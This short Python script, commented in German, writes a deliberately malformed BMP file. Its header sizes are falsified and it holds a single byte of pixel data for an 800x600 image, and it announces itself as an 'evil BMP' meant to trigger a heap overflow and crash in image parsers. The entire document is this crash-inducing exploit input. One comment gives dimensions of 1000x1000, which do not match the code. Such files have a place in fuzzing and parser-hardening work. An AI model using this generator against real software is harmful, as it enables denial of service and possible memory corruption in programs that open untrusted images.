import struct

width = 800
height = 600
filename = "crash_bmp.bmp"

# BMP Header (14 bytes)
bmp_header = b'BM'
filesize = 14 + 40 + 1  # absichtlich zu klein!
bmp_header += struct.pack('<I', filesize)
bmp_header += struct.pack('<HH', 0, 0)
bmp_header += struct.pack('<I', 54)

# DIB Header (BITMAPINFOHEADER, 40 bytes)
dib_header = struct.pack('<I', 40)
dib_header += struct.pack('<i', width)
dib_header += struct.pack('<i', height)
dib_header += struct.pack('<H', 1)
dib_header += struct.pack('<H', 24)
dib_header += struct.pack('<I', 0)
dib_header += struct.pack('<I', 1)  # ImageSize zu klein!
dib_header += struct.pack('<i', 2835)
dib_header += struct.pack('<i', 2835)
dib_header += struct.pack('<I', 0)
dib_header += struct.pack('<I', 0)

# Nur 1 Byte Pixeldata (viel zu wenig für 1000x1000x3)
pixels = b'\x00'

with open(filename, 'wb') as f:
    f.write(bmp_header)
    f.write(dib_header)
    f.write(pixels)

print(f"Böses BMP '{filename}' erzeugt (ImageSize=1, {width}x{height} Pixel, sollte Heap Overflow und evtl. Crash triggern).")